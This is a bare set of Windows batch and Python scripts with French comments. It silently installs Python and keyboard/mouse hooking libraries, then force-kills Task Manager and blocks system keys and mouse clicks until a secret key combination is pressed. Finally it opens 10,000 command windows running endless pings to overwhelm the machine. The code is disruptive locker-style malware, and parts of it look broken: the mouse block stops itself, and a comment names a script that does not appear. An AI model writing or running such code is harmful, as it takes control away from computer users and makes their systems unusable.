curl -o python-installer.exe https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe
start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0




import subprocess

subprocess.run('start cmd /k "pip install keyboard"', shell=True)
subprocess.run('start cmd /k "pip install pythonping"', shell=True)
subprocess.run('start cmd /k "pip install pynput"', shell=True)
subprocess.run('start cmd /k "pip install keyboard pynput"', shell=True)


import subprocess

subprocess.run(["taskkill", "/f", "/im", "Taskmgr.exe"])





import keyboard
from pynput import mouse
import threading

# Fonction pour bloquer la souris
def block_mouse():
    def on_click(x, y, button, pressed):
        return False  # bloque tous les clics

    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# Démarrer le blocage de la souris dans un thread
mouse_thread = threading.Thread(target=block_mouse, daemon=True)
mouse_thread.start()

# Bloquer certaines touches
keyboard.block_key("alt")
keyboard.block_key("ctrl")
keyboard.block_key("win")
keyboard.block_key("alt+tab")
keyboard.block_key("alt+f4")



# Attendre la combinaison AltGr + Ctrl pour sortir
keyboard.wait("alt gr+ctrl")

print("Déblocage effectué. Le script se termine.")








import subprocess

# Lance 'autre.py' dans un nouveau processus Python
for loop in range(100):
    for loop in range(100):
        subprocess.run('start cmd /k "ping localhost -n 10000000"', shell=True)
